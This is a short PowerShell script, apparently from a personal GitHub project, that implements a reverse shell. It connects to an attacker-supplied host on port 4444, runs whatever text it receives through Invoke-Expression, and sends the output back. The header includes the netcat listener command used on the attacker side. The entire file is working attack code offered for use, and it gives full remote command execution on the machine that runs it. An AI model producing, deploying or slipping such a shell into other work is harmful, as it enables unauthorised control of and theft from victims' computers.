
<#

 Basic Shell Reverse 

.DESCRIPTION
    The following PowerShell script enables you to establish a remote shell with a target.


.EXAMPLE
    To run this string, we must to have  netcat running in the port 4444 as following: nc -l -p 4444
    The example below execute the program
    PS C:\> .\shell_reverse.ps1


.NOTES
    Author: rolEYder
    Github: https://github.com/RolEYder
    Last Edit: 2020-12-07
    Current Version: v1.0.0
 
.TESTING
    Windows 7 Server Pack 1
#>



# Socket Connection
$client = New-Object System.Net.Sockets.TCPCLient("{HOST-IP}", 4444);
$stream = $client.GetStream();


# Send shell Prompt

$get = "PS" + (pwd).Path + ">"
$sendbyte = ([text.encoding]::ASCII).GetBytes($get)
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
[byte[]]$bytes = 0..255|%{0};

# Wait for response, execute whatever's coming, then loop back
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS" + (pwd).Path + ">";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
